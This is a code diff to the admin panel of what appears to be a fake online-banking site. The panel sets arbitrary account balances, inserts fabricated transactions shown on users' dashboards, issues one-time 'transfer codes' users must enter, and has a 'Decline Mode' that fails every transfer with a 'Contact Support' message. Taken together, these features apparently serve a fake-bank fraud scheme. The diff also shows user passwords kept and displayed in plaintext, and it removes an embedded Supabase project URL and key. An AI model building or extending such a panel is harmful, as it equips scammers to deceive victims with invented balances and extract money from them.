@@ -92,9 +92,6 @@ tr:last-child td { border-bottom: none; }
 .stat-card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
 .stat-label { font-size: 0.78rem; color: var(--gray); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
 .stat-value { font-size: 1.6rem; font-weight: 700; color: var(--dark); }
-.stat-change { font-size: 0.78rem; margin-top: 4px; }
-.stat-change.up { color: var(--green); }
-.stat-change.down { color: var(--red); }
 
 /* TOAST */
 .toast { position: fixed; bottom: 24px; right: 24px; background: var(--green); color: #fff; padding: 12px 20px; border-radius: 4px; font-size: 0.88rem; font-weight: 600; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 2000; transform: translateY(80px); opacity: 0; transition: all 0.3s ease; }
@@ -108,12 +105,6 @@ tr:last-child td { border-bottom: none; }
 .spinner { width: 40px; height: 40px; border: 4px solid #eee; border-top-color: var(--red); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 12px; }
 @keyframes spin { to { transform: rotate(360deg); } }
 
-/* TABS */
-.tabs { display: flex; gap: 4px; background: #f5f5f5; padding: 4px; border-radius: 8px; margin-bottom: 20px; flex-wrap: wrap; }
-.tab { padding: 10px 20px; border: none; background: none; color: var(--gray); font-size: 0.88rem; font-weight: 600; cursor: pointer; border-radius: 6px; transition: all 0.2s; }
-.tab:hover { color: var(--dark); }
-.tab.active { background: #fff; color: var(--red); box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-
 /* SECTION */
 .section { display: none; }
 .section.active { display: block; }
@@ -124,9 +115,6 @@ tr:last-child td { border-bottom: none; }
 .alert-warning { background: #fff8e1; color: #f57f17; border-left: 4px solid #f57f17; }
 .alert-danger { background: #ffebee; color: #c62828; border-left: 4px solid #c62828; }
 .alert-success { background: #e8f5e9; color: #2e7d32; border-left: 4px solid #2e7d32; }
-
-/* GRID */
-.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
 
 /* CODE GENERATOR */
 .code-display { background: #1a1a1a; color: var(--gold); padding: 20px; border-radius: 8px; text-align: center; margin: 16px 0; }
@@ -139,7 +127,7 @@ tr:last-child td { border-bottom: none; }
 .code-card .code-status { font-size: 0.75rem; margin-top: 4px; }
 .code-card .code-date { font-size: 0.7rem; color: #888; margin-top: 2px; }
 
-/* TRANSFER CODES TAB */
+/* TRANSFER CODES */
 .transfer-codes-section { margin-top: 16px; }
 .user-codes-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
 .generated-codes-list { display: flex; flex-direction: column; gap: 8px; }
@@ -151,7 +139,7 @@ tr:last-child td { border-bottom: none; }
 .generated-code-item .code-status { font-size: 0.75rem; font-weight: 600; }
 .generated-code-item .code-actions { display: flex; gap: 8px; align-items: center; }
 
-/* DEBUG SECTION */
+/* DEBUG */
 .debug-section { background: #f0f0f0; border: 2px dashed #ccc; padding: 16px; margin-top: 20px; border-radius: 8px; }
 .debug-section h3 { font-size: 0.9rem; margin-bottom: 12px; color: #666; }
 .debug-btn { padding: 6px 12px; font-size: 0.75rem; margin-right: 8px; margin-bottom: 8px; }
@@ -162,30 +150,17 @@ tr:last-child td { border-bottom: none; }
   .mobile-menu-btn { display: block; }
   .admin-nav { display: none; width: 100%; }
   .admin-nav.open { display: flex; flex-direction: column; }
-  .admin-nav a { border-radius: 4px; }
-
   .stats-grid { grid-template-columns: repeat(2, 1fr); }
-  .form-row, .grid-2 { grid-template-columns: 1fr; }
-
+  .form-row { grid-template-columns: 1fr; }
   .container { padding: 16px; }
-
   table { display: block; overflow-x: auto; }
-
   .codes-grid { grid-template-columns: 1fr; }
-
   .generated-code-item { flex-direction: column; gap: 8px; text-align: center; }
   .generated-code-item .code-info { align-items: center; }
-
-  input, select, textarea {
-    font-size: 16px !important;
-  }
+  input, select, textarea { font-size: 16px !important; }
 }
-
 @media (max-width: 480px) {
-  .admin-logo { font-size: 1.1rem; }
   .stats-grid { grid-template-columns: 1fr; }
-  .card-header { padding: 12px 14px; }
-  .card-body { padding: 14px; }
 }
 </style>
 </head>
@@ -209,7 +184,7 @@ tr:last-child td { border-bottom: none; }
     <a href="#" id="nav-transactions">Transactions</a>
     <a href="#" id="nav-add-transaction">Add Transaction</a>
     <a href="#" id="nav-transfer-codes">Transfer Codes</a>
-    <a href="#" id="nav-open-banking" style="color: var(--gold);">Open Banking</a>
+    <a href="index.html" target="_blank" style="color: var(--gold);">Open Banking Page</a>
   </nav>
   <div class="admin-user">Admin Panel</div>
 </header>
@@ -220,7 +195,8 @@ tr:last-child td { border-bottom: none; }
   <!-- DASHBOARD SECTION -->
   <div id="section-dashboard" class="section active">
     <div class="alert alert-info">
-      <strong>Admin Dashboard</strong> - Manage users, view transactions, add transactions, and generate transfer codes.
+      <strong>Admin Dashboard</strong> — Manage users, transactions, and transfer codes.
+      <a href="index.html" target="_blank" style="margin-left:12px;font-weight:700;">Open Banking Page ↗</a>
     </div>
 
     <div class="stats-grid">
@@ -278,6 +254,7 @@ tr:last-child td { border-bottom: none; }
             <tr>
               <th>Name</th>
               <th>Username</th>
+              <th>Password</th>
               <th>Checking</th>
               <th>Savings</th>
               <th>Status</th>
@@ -324,7 +301,7 @@ tr:last-child td { border-bottom: none; }
       </div>
       <div class="card-body">
         <div class="alert alert-warning">
-          <strong>Note:</strong> This will add a transaction that appears on the user's dashboard under "Recent Transactions".
+          <strong>Note:</strong> This will add a transaction visible on the user's banking dashboard.
         </div>
         <form id="add-txn-form">
           <div class="form-row">
@@ -395,7 +372,7 @@ tr:last-child td { border-bottom: none; }
       </div>
       <div class="card-body">
         <div class="alert alert-info">
-          <strong>How it works:</strong> Generate a 6-digit code for a user. The user must enter this code when making a transfer. Each code can only be used once.
+          <strong>How it works:</strong> Generate a 6-digit code for a user. The user enters this code when making a transfer. Each code can only be used once.
         </div>
         <div class="form-group">
           <label class="form-label">Select User</label>
@@ -404,7 +381,7 @@ tr:last-child td { border-bottom: none; }
           </select>
         </div>
         <div class="form-group">
-          <label class="form-label">Number of Codes to Generate</label>
+          <label class="form-label">Number of Codes</label>
           <select class="form-select" id="code-count">
             <option value="1">1 Code</option>
             <option value="3">3 Codes</option>
@@ -412,18 +389,14 @@ tr:last-child td { border-bottom: none; }
             <option value="10">10 Codes</option>
           </select>
         </div>
-        <button class="btn btn-primary" id="generate-codes-btn" style="margin-bottom: 20px;">
-          Generate Code(s)
-        </button>
+        <button class="btn btn-primary" id="generate-codes-btn" style="margin-bottom: 20px;">Generate Code(s)</button>
 
         <div id="generated-code-display" style="display:none;">
           <div class="code-display">
             <div class="code-label">Generated Code</div>
             <div class="code-value" id="new-code-value">------</div>
           </div>
-          <div class="alert alert-success" id="code-copy-note">
-            Code copied to clipboard! Share this code with the user.
-          </div>
+          <div class="alert alert-success">Code generated! Share this with the user.</div>
         </div>
 
         <div class="transfer-codes-section" id="user-codes-section" style="display:none;">
@@ -439,7 +412,7 @@ tr:last-child td { border-bottom: none; }
     <div class="card">
       <div class="card-header">
         <h2>All Active Transfer Codes</h2>
-        <button class="btn-small" id="export-codes">Export</button>
+        <button class="btn-small" id="export-codes">Export CSV</button>
       </div>
       <div class="card-body">
         <div id="all-codes-grid" class="codes-grid"></div>
@@ -449,11 +422,11 @@ tr:last-child td { border-bottom: none; }
 
   <!-- DEBUG SECTION -->
   <div class="debug-section">
-    <h3>Debug Tools (For Testing)</h3>
-    <button class="btn debug-btn btn-secondary" id="open-banking">Open Banking Page</button>
+    <h3>Debug Tools</h3>
+    <a href="index.html" target="_blank" class="btn debug-btn btn-secondary">Open Banking Page</a>
     <button class="btn debug-btn btn-secondary" id="refresh-data">Refresh Data</button>
     <button class="btn debug-btn btn-danger" id="clear-data">Clear All Data</button>
-    <button class="btn debug-btn btn-warning" id="show-storage">Show localStorage</button>
+    <button class="btn debug-btn btn-secondary" id="show-storage">Show localStorage</button>
   </div>
 
 </div>
@@ -474,11 +447,11 @@ tr:last-child td { border-bottom: none; }
         <div class="form-row">
           <div class="form-group">
             <label class="form-label">Username</label>
-            <input type="text" class="form-input" id="user-username" placeholder="jsmith" required>
+            <input type="text" class="form-input" id="user-username" placeholder="jsmith" required autocapitalize="none" autocorrect="off">
           </div>
           <div class="form-group">
             <label class="form-label">Password</label>
-            <input type="password" class="form-input" id="user-password" placeholder="****" required>
+            <input type="text" class="form-input" id="user-password" placeholder="Enter password" required>
           </div>
         </div>
         <div class="form-row">
@@ -520,6 +493,16 @@ tr:last-child td { border-bottom: none; }
         </div>
         <div class="form-row">
           <div class="form-group">
+            <label class="form-label">Username</label>
+            <input type="text" class="form-input" id="edit-username" autocapitalize="none" autocorrect="off">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Password</label>
+            <input type="text" class="form-input" id="edit-password">
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
             <label class="form-label">Checking Balance</label>
             <input type="number" class="form-input" id="edit-checking" step="0.01">
           </div>
@@ -534,12 +517,10 @@ tr:last-child td { border-bottom: none; }
         </div>
 
         <div style="margin-top: 20px; padding-top: 20px; border-top: 2px solid #eee;">
-          <h4 style="font-size: 0.9rem; margin-bottom: 12px; color: var(--dark);">Transaction Controls</h4>
-
+          <h4 style="font-size: 0.9rem; margin-bottom: 12px;">Transaction Controls</h4>
           <div class="alert alert-danger" style="margin-bottom: 12px;">
-            <strong>Decline Mode:</strong> When enabled, ALL transactions for this user will be declined.
+            <strong>Decline Mode:</strong> When ON, ALL transfer attempts will be declined.
           </div>
-
           <div class="toggle-group">
             <label class="toggle-switch">
               <input type="checkbox" id="edit-decline-mode">
@@ -547,10 +528,6 @@ tr:last-child td { border-bottom: none; }
             </label>
             <label class="toggle-label">Enable Decline Mode</label>
           </div>
-          <p style="font-size: 0.8rem; color: #666; margin-top: 4px;">
-            When ON: All transfer attempts will show a 4-second loading then "Contact Support" message.<br>
-            When OFF: All transactions will be processed successfully.
-          </p>
         </div>
       </form>
     </div>
@@ -563,36 +540,8 @@ tr:last-child td { border-bottom: none; }
 
 <div class="toast" id="toast"></div>
 
-<!-- SUPABASE SDK -->
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.0/dist/umd/supabase.js"></script>
-
 <script>
-// ── SUPABASE CONFIGURATION ──
-const SUPABASE_URL = 'https://vlsnstzqwqformfgmtgi.supabase.co';
-const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZsc25zdHpxd3Fmb3JtZmdtdGdpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjkzOTMsImV4cCI6MjA5Mzc0NTM5M30.l01mCGL56mIiuz07CJltGULXMrnpKS5xHZwimHFm7Kk';
-
-// Initialize Supabase client
-let supabase = null;
-let supabaseReady = false;
-
-function initSupabase() {
-  try {
-    if (typeof window.supabase !== 'undefined') {
-      supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-      supabaseReady = true;
-      console.log('Supabase initialized successfully');
-      return true;
-    } else {
-      console.warn('Supabase SDK not loaded');
-      return false;
-    }
-  } catch (e) {
-    console.error('Failed to initialize Supabase:', e);
-    return false;
-  }
-}
-
-// ── STATE MANAGEMENT ──
+// ── SHARED STORAGE KEY — must match index.html exactly ──
 const STORE_KEY = 'wf_db';
 
 const DEFAULT_USER = {
@@ -606,19 +555,32 @@ const DEFAULT_USER = {
   declineMode: false
 };
 
-let users = [];
-let transactions = [];
-let codes = [];
+let users = [], transactions = [], codes = [];
 
-function isLocalStorageAvailable() {
+function isLSAvailable() {
+  try { localStorage.setItem('__t','1'); localStorage.removeItem('__t'); return true; }
+  catch(e) { return false; }
+}
+
+function loadDB() {
+  if (!isLSAvailable()) return { users: [], transactions: [], codes: [] };
   try {
-    const test = '__storage_test__';
-    localStorage.setItem(test, test);
-    localStorage.removeItem(test);
-    return true;
-  } catch (e) {
-    return false;
+    const raw = localStorage.getItem(STORE_KEY);
+    if (!raw) return { users: [], transactions: [], codes: [] };
+    const db = JSON.parse(raw);
+    if (!db.users)        db.users        = [];
+    if (!db.transactions) db.transactions = [];
+    if (!db.codes)        db.codes        = [];
+    return db;
+  } catch(e) {
+    try { localStorage.removeItem(STORE_KEY); } catch(e2) {}
+    return { users: [], transactions: [], codes: [] };
   }
+}
+
+function saveDB(db) {
+  if (!isLSAvailable()) return;
+  try { localStorage.setItem(STORE_KEY, JSON.stringify(db)); } catch(e) {}
 }
 
 function initDB() {
@@ -629,42 +591,8 @@ function initDB() {
     db.codes = [];
     saveDB(db);
   }
-  if (!db.codes) db.codes = [];
-  if (!db.transactions) db.transactions = [];
-  saveDB(db);
-}
-
-function loadDB() {
-  if (!isLocalStorageAvailable()) {
-    return { users: [], transactions: [], codes: [] };
-  }
-
-  try {
-    const raw = localStorage.getItem(STORE_KEY);
-    if (!raw) {
-      return { users: [], transactions: [], codes: [] };
-    }
-    const db = JSON.parse(raw);
-    if (!db.users) db.users = [];
-    if (!db.transactions) db.transactions = [];
-    if (!db.codes) db.codes = [];
-    return db;
-  } catch(e) {
-    try { localStorage.removeItem(STORE_KEY); } catch (e2) {}
-    return { users: [], transactions: [], codes: [] };
-  }
-}
-
-function saveDB(db) {
-  if (!isLocalStorageAvailable()) return false;
-
-  try {
-    localStorage.setItem(STORE_KEY, JSON.stringify(db));
-    return true;
-  } catch(e) {
-    console.error('Error saving database:', e);
-    return false;
-  }
+  if (!db.codes)        { db.codes = [];        saveDB(db); }
+  if (!db.transactions) { db.transactions = []; saveDB(db); }
 }
 
 // ── UTILS ──
@@ -680,14 +608,8 @@ function showSection(id) {
   document.querySelectorAll('.admin-nav a').forEach(a => a.classList.remove('active'));
   const navLink = document.getElementById('nav-' + id);
   if (navLink) navLink.classList.add('active');
-
-  const nav = document.getElementById('admin-nav');
-  if (nav) nav.classList.remove('open');
-
-  if (id === 'transfer-codes') {
-    loadAllCodes();
-    populateCodeUserSelect();
-  }
+  document.getElementById('admin-nav').classList.remove('open');
+  if (id === 'transfer-codes') { loadAllCodes(); populateCodeUserSelect(); }
   if (id === 'users') renderUsers();
   if (id === 'transactions') renderTransactions();
   if (id === 'add-transaction') populateUserSelect();
@@ -704,16 +626,14 @@ function toast(msg, isErr) {
   setTimeout(() => t.classList.remove('show'), 3200);
 }
 
-// ── DATA LOADING ──
+// ── DATA ──
 function loadData() {
-  showLoading('Loading data...');
-
+  showLoading('Loading...');
   setTimeout(() => {
     const db = loadDB();
     users = db.users || [];
     transactions = db.transactions || [];
     codes = db.codes || [];
-
     updateDashboard();
     renderUsers();
     renderTransactions();
@@ -727,129 +647,99 @@ function refreshData() {
   users = db.users || [];
   transactions = db.transactions || [];
   codes = db.codes || [];
-
   updateDashboard();
   renderUsers();
   renderTransactions();
   populateUserSelect();
+  toast('Data refreshed!');
 }
 
 // ── DASHBOARD ──
 function updateDashboard() {
   document.getElementById('stat-users').textContent = users.length;
   document.getElementById('stat-txns').textContent = transactions.length;
-
-  const totalBal = users.reduce((sum, u) => sum + (u.checking || 0) + (u.savings || 0) + (u.retire || 0), 0);
+  const totalBal = users.reduce((s, u) => s + (u.checking||0) + (u.savings||0) + (u.retire||0), 0);
   document.getElementById('stat-balance').textContent = fmt(totalBal);
+  document.getElementById('stat-codes').textContent = codes.filter(c => !c.used).length;
 
-  const activeCodes = codes.filter(c => !c.used);
-  document.getElementById('stat-codes').textContent = activeCodes.length;
-
-  const recent = document.getElementById('recent-txns');
+  const tbody = document.getElementById('recent-txns');
   const last5 = transactions.slice(0, 5);
-  if (last5.length > 0) {
-    recent.innerHTML = last5.map(t => {
-      const u = users.find(u => u.id === t.userId) || {};
-      return `<tr>
-        <td>${t.date}</td>
-        <td>${u.name || 'Unknown'}</td>
-        <td>${t.desc}</td>
-        <td><span class="badge ${t.type === 'credit' ? 'badge-success' : 'badge-danger'}">${t.type}</span></td>
-        <td>${fmt(t.amount)}</td>
-        <td><span class="badge badge-${t.status === 'success' ? 'success' : t.status === 'declined' ? 'danger' : 'warning'}">${t.status || 'success'}</span></td>
-      </tr>`;
-    }).join('');
-  } else {
-    recent.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:#888">No transactions yet</td></tr>';
-  }
+  tbody.innerHTML = last5.length > 0 ? last5.map(t => {
+    const u = users.find(u => u.id === t.userId) || {};
+    return `<tr>
+      <td>${t.date}</td>
+      <td>${u.name || 'Unknown'}</td>
+      <td>${t.desc}</td>
+      <td><span class="badge ${t.type==='credit'?'badge-success':'badge-danger'}">${t.type}</span></td>
+      <td>${fmt(t.amount)}</td>
+      <td><span class="badge badge-${t.status==='success'?'success':t.status==='declined'?'danger':'warning'}">${t.status||'success'}</span></td>
+    </tr>`;
+  }).join('') : '<tr><td colspan="6" style="text-align:center;padding:20px;color:#888">No transactions yet</td></tr>';
 }
 
 // ── RENDER USERS ──
 function renderUsers() {
   const tbody = document.getElementById('users-table');
-  if (users.length > 0) {
-    tbody.innerHTML = users.map(u => {
-      const declineStatus = u.declineMode
-        ? '<span class="badge badge-danger">Decline Mode ON</span>'
-        : '<span class="badge badge-success">Normal</span>';
-      return `<tr>
-        <td><strong>${u.name}</strong></td>
-        <td>${u.username}</td>
-        <td>${fmt(u.checking)}</td>
-        <td>${fmt(u.savings)}</td>
-        <td>${declineStatus}</td>
-        <td>
-          <button class="btn btn-small btn-secondary" onclick="editUser('${u.id}')">Edit</button>
-          <button class="btn btn-small btn-primary" onclick="quickGenerateCode('${u.id}')">Generate Code</button>
-        </td>
-      </tr>`;
-    }).join('');
-  } else {
-    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:#888">No users found.</td></tr>';
-  }
+  tbody.innerHTML = users.length > 0 ? users.map(u => `<tr>
+    <td><strong>${u.name}</strong></td>
+    <td>${u.username}</td>
+    <td><code style="background:#f0f0f0;padding:2px 6px;border-radius:3px;font-size:0.85rem">${u.password}</code></td>
+    <td>${fmt(u.checking)}</td>
+    <td>${fmt(u.savings)}</td>
+    <td>${u.declineMode ? '<span class="badge badge-danger">Decline ON</span>' : '<span class="badge badge-success">Normal</span>'}</td>
+    <td>
+      <button class="btn btn-small btn-secondary" onclick="editUser('${u.id}')">Edit</button>
+      <button class="btn btn-small btn-primary" onclick="quickGenerateCode('${u.id}')">Gen Code</button>
+    </td>
+  </tr>`).join('') : '<tr><td colspan="7" style="text-align:center;padding:20px;color:#888">No users found.</td></tr>';
 }
 
 // ── RENDER TRANSACTIONS ──
 function renderTransactions() {
   const tbody = document.getElementById('all-txns');
-  if (transactions.length > 0) {
-    tbody.innerHTML = transactions.map(t => {
-      const u = users.find(u => u.id === t.userId) || {};
-      return `<tr>
-        <td>${t.date}</td>
-        <td>${u.name || 'Unknown'}</td>
-        <td>${t.desc}</td>
-        <td>${t.acct || '-'}</td>
-        <td><span class="badge ${t.type === 'credit' ? 'badge-success' : 'badge-danger'}">${t.type}</span></td>
-        <td>${fmt(t.amount)}</td>
-        <td><span class="badge badge-${t.status === 'success' ? 'success' : t.status === 'declined' ? 'danger' : 'warning'}">${t.status || 'success'}</span></td>
-      </tr>`;
-    }).join('');
-  } else {
-    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:20px;color:#888">No transactions found.</td></tr>';
-  }
+  tbody.innerHTML = transactions.length > 0 ? transactions.map(t => {
+    const u = users.find(u => u.id === t.userId) || {};
+    return `<tr>
+      <td>${t.date}</td>
+      <td>${u.name || 'Unknown'}</td>
+      <td>${t.desc}</td>
+      <td>${t.acct || '-'}</td>
+      <td><span class="badge ${t.type==='credit'?'badge-success':'badge-danger'}">${t.type}</span></td>
+      <td>${fmt(t.amount)}</td>
+      <td><span class="badge badge-${t.status==='success'?'success':t.status==='declined'?'danger':'warning'}">${t.status||'success'}</span></td>
+    </tr>`;
+  }).join('') : '<tr><td colspan="7" style="text-align:center;padding:20px;color:#888">No transactions found.</td></tr>';
 }
 
-// ── POPULATE USER SELECT ──
+// ── USER SELECTS ──
 function populateUserSelect() {
-  const select = document.getElementById('txn-user');
-  if (select) {
-    select.innerHTML = '<option value="">Select a user...</option>' +
-      users.map(u => `<option value="${u.id}">${u.name} (${u.username})</option>`).join('');
-  }
+  const sel = document.getElementById('txn-user');
+  if (sel) sel.innerHTML = '<option value="">Select a user...</option>' + users.map(u => `<option value="${u.id}">${u.name} (${u.username})</option>`).join('');
 }
 
 function populateCodeUserSelect() {
-  const select = document.getElementById('code-user');
-  if (select) {
-    select.innerHTML = '<option value="">Select a user...</option>' +
-      users.map(u => `<option value="${u.id}">${u.name} (${u.username})</option>`).join('');
-  }
+  const sel = document.getElementById('code-user');
+  if (sel) sel.innerHTML = '<option value="">Select a user...</option>' + users.map(u => `<option value="${u.id}">${u.name} (${u.username})</option>`).join('');
 }
 
 // ── ADD USER ──
 function addUser() {
-  const name = document.getElementById('user-name').value.trim();
-  const username = document.getElementById('user-username').value.trim();
-  const password = document.getElementById('user-password').value;
+  const name     = document.getElementById('user-name').value.trim();
+  const username = document.getElementById('user-username').value.trim().toLowerCase();
+  const password = document.getElementById('user-password').value.trim();
   const checking = parseFloat(document.getElementById('user-checking').value) || 0;
-  const savings = parseFloat(document.getElementById('user-savings').value) || 0;
-  const retire = parseFloat(document.getElementById('user-retire').value) || 0;
+  const savings  = parseFloat(document.getElementById('user-savings').value)  || 0;
+  const retire   = parseFloat(document.getElementById('user-retire').value)   || 0;
 
-  if (!name || !username || !password) {
-    toast('Please fill in all required fields.', true);
-    return;
+  if (!name || !username || !password) { toast('Please fill in all required fields.', true); return; }
+
+  // Check for duplicate username
+  if (users.find(u => u.username.toLowerCase() === username)) {
+    toast('Username already exists. Choose a different one.', true); return;
   }
 
   showLoading('Adding user...');
-
-  const newUser = {
-    id: 'user-' + Date.now(),
-    name, username, password,
-    checking, savings, retire,
-    declineMode: false
-  };
-
+  const newUser = { id: 'user-' + Date.now(), name, username, password, checking, savings, retire, declineMode: false };
   const db = loadDB();
   db.users.push(newUser);
   saveDB(db);
@@ -862,7 +752,7 @@ function addUser() {
     updateDashboard();
     populateUserSelect();
     hideLoading();
-    toast('User added successfully!');
+    toast('User "' + username + '" added! Login: ' + username + ' / ' + password);
   }, 300);
 }
 
@@ -870,93 +760,91 @@ function addUser() {
 function editUser(id) {
   const u = users.find(u => u.id === id);
   if (!u) return;
-
-  document.getElementById('edit-user-id').value = u.id;
-  document.getElementById('edit-name').value = u.name;
-  document.getElementById('edit-checking').value = u.checking;
-  document.getElementById('edit-savings').value = u.savings;
-  document.getElementById('edit-retire').value = u.retire;
+  document.getElementById('edit-user-id').value      = u.id;
+  document.getElementById('edit-name').value         = u.name;
+  document.getElementById('edit-username').value     = u.username;
+  document.getElementById('edit-password').value     = u.password;
+  document.getElementById('edit-checking').value     = u.checking;
+  document.getElementById('edit-savings').value      = u.savings;
+  document.getElementById('edit-retire').value       = u.retire;
   document.getElementById('edit-decline-mode').checked = u.declineMode || false;
-
   openModal('edit-user');
 }
 
 function saveUser() {
-  const id = document.getElementById('edit-user-id').value;
-  const name = document.getElementById('edit-name').value.trim();
-  const checking = parseFloat(document.getElementById('edit-checking').value) || 0;
-  const savings = parseFloat(document.getElementById('edit-savings').value) || 0;
-  const retire = parseFloat(document.getElementById('edit-retire').value) || 0;
+  const id          = document.getElementById('edit-user-id').value;
+  const name        = document.getElementById('edit-name').value.trim();
+  const username    = document.getElementById('edit-username').value.trim().toLowerCase();
+  const password    = document.getElementById('edit-password').value.trim();
+  const checking    = parseFloat(document.getElementById('edit-checking').value)    || 0;
+  const savings     = parseFloat(document.getElementById('edit-savings').value)     || 0;
+  const retire      = parseFloat(document.getElementById('edit-retire').value)      || 0;
   const declineMode = document.getElementById('edit-decline-mode').checked;
 
   showLoading('Saving...');
-
   const db = loadDB();
   const idx = db.users.findIndex(u => u.id === id);
   if (idx !== -1) {
-    db.users[idx].name = name;
-    db.users[idx].checking = checking;
-    db.users[idx].savings = savings;
-    db.users[idx].retire = retire;
+    db.users[idx].name        = name;
+    db.users[idx].username    = username || db.users[idx].username;
+    db.users[idx].password    = password || db.users[idx].password;
+    db.users[idx].checking    = checking;
+    db.users[idx].savings     = savings;
+    db.users[idx].retire      = retire;
     db.users[idx].declineMode = declineMode;
     saveDB(db);
     users = db.users;
   }
-
   setTimeout(() => {
     closeModal('edit-user');
     renderUsers();
     updateDashboard();
     hideLoading();
-    toast('User updated successfully!');
+    toast('User updated!');
   }, 300);
 }
 
 // ── ADD TRANSACTION ──
 function addTransaction() {
-  const userId = document.getElementById('txn-user').value;
-  const type = document.getElementById('txn-type').value;
-  const amount = parseFloat(document.getElementById('txn-amount').value);
+  const userId  = document.getElementById('txn-user').value;
+  const type    = document.getElementById('txn-type').value;
+  const amount  = parseFloat(document.getElementById('txn-amount').value);
   const account = document.getElementById('txn-account').value;
-  const desc = document.getElementById('txn-desc').value.trim();
-  const date = document.getElementById('txn-date').value;
-  const status = document.getElementById('txn-status').value;
-  const memo = document.getElementById('txn-memo').value;
+  const desc    = document.getElementById('txn-desc').value.trim();
+  const date    = document.getElementById('txn-date').value;
+  const status  = document.getElementById('txn-status').value;
+  const memo    = document.getElementById('txn-memo').value;
 
-  if (!userId || !amount || !desc || !date) {
-    toast('Please fill in all required fields.', true);
-    return;
-  }
+  if (!userId || !amount || !desc || !date) { toast('Please fill in all required fields.', true); return; }
 
   showLoading('Adding transaction...');
 
   const newTxn = {
-    id: 'tx' + Date.now(),
-    userId: userId,
-    type: type,
-    amount: amount,
-    desc: desc,
+    id: 'tx' + Date.now(), userId, type, amount, desc,
     acct: account,
-    date: formatDate(new Date(date)),
-    status: status,
-    memo: memo,
-    from: account,
-    to: account
+    date: formatDate(new Date(date + 'T12:00:00')),
+    status, memo, from: account, to: account
   };
 
   const db = loadDB();
   db.transactions.unshift(newTxn);
 
+  // Update balance for credit transactions
   if (type === 'credit' && status === 'success') {
-    const userIdx = db.users.findIndex(u => u.id === userId);
-    if (userIdx !== -1) {
-      if (account.includes('Checking')) {
-        db.users[userIdx].checking += amount;
-      } else if (account.includes('Savings')) {
-        db.users[userIdx].savings += amount;
-      } else if (account.includes('Retire')) {
-        db.users[userIdx].retire += amount;
-      }
+    const uIdx = db.users.findIndex(u => u.id === userId);
+    if (uIdx !== -1) {
+      if (account.includes('Checking')) db.users[uIdx].checking += amount;
+      else if (account.includes('Savings')) db.users[uIdx].savings += amount;
+      else if (account.includes('Retire')) db.users[uIdx].retire += amount;
+    }
+  }
+  // Deduct balance for debit transactions
+  if (type === 'debit' && status === 'success') {
+    const uIdx = db.users.findIndex(u => u.id === userId);
+    if (uIdx !== -1) {
+      if (account.includes('Checking')) db.users[uIdx].checking = Math.max(0, db.users[uIdx].checking - amount);
+      else if (account.includes('Savings')) db.users[uIdx].savings = Math.max(0, db.users[uIdx].savings - amount);
+      else if (account.includes('Retire')) db.users[uIdx].retire = Math.max(0, db.users[uIdx].retire - amount);
     }
   }
 
@@ -972,37 +860,25 @@ function addTransaction() {
     renderUsers();
     updateDashboard();
     hideLoading();
-    toast('Transaction added successfully!');
+    toast('Transaction added!');
   }, 300);
 }
 
 // ── TRANSFER CODES ──
 function generateCodes() {
   const userId = document.getElementById('code-user').value;
-  const count = parseInt(document.getElementById('code-count').value) || 1;
-
-  if (!userId) {
-    toast('Please select a user first.', true);
-    return;
-  }
+  const count  = parseInt(document.getElementById('code-count').value) || 1;
+  if (!userId) { toast('Please select a user first.', true); return; }
 
   showLoading('Generating codes...');
-
   const db = loadDB();
-  const generatedCodes = [];
+  const generated = [];
 
   for (let i = 0; i < count; i++) {
-    const code = generateRandomCode();
-    const codeEntry = {
-      id: 'code-' + Date.now() + '-' + i,
-      code: code,
-      userId: userId,
-      createdAt: new Date().toISOString(),
-      used: false,
-      usedAt: null
-    };
-    db.codes.push(codeEntry);
-    generatedCodes.push(codeEntry);
+    const code = String(Math.floor(100000 + Math.random() * 900000));
+    const entry = { id: 'code-' + Date.now() + '-' + i, code, userId, createdAt: new Date().toISOString(), used: false, usedAt: null };
+    db.codes.push(entry);
+    generated.push(entry);
   }
 
   saveDB(db);
@@ -1010,217 +886,149 @@ function generateCodes() {
 
   setTimeout(() => {
     hideLoading();
-
-    if (generatedCodes.length === 1) {
-      document.getElementById('new-code-value').textContent = generatedCodes[0].code;
-      document.getElementById('generated-code-display').style.display = 'block';
-      if (navigator.clipboard) {
-        navigator.clipboard.writeText(generatedCodes[0].code).catch(() => {});
-      }
+    const displayEl = document.getElementById('new-code-value');
+    const displayWrap = document.getElementById('generated-code-display');
+    if (generated.length === 1) {
+      displayEl.textContent = generated[0].code;
+      if (navigator.clipboard) navigator.clipboard.writeText(generated[0].code).catch(() => {});
     } else {
-      document.getElementById('new-code-value').textContent = generatedCodes.length + ' codes generated';
-      document.getElementById('generated-code-display').style.display = 'block';
+      displayEl.textContent = generated.length + ' codes created';
     }
-
+    displayWrap.style.display = 'block';
     loadUserCodes();
     loadAllCodes();
     updateDashboard();
-    toast(count + ' code(s) generated successfully!');
+    toast(count + ' code(s) generated!');
   }, 300);
 }
 
-function generateRandomCode() {
-  let code = '';
-  for (let i = 0; i < 6; i++) {
-    code += Math.floor(Math.random() * 10);
-  }
-  return code;
-}
-
 function quickGenerateCode(userId) {
-  const select = document.getElementById('code-user');
-  if (select) select.value = userId;
+  document.getElementById('code-user').value = userId;
   loadUserCodes();
   showSection('transfer-codes');
-  setTimeout(() => generateCodes(), 100);
+  setTimeout(() => generateCodes(), 150);
 }
 
 function loadUserCodes() {
   const userId = document.getElementById('code-user').value;
-  if (!userId) {
-    const section = document.getElementById('user-codes-section');
-    if (section) section.style.display = 'none';
-    return;
-  }
+  const section = document.getElementById('user-codes-section');
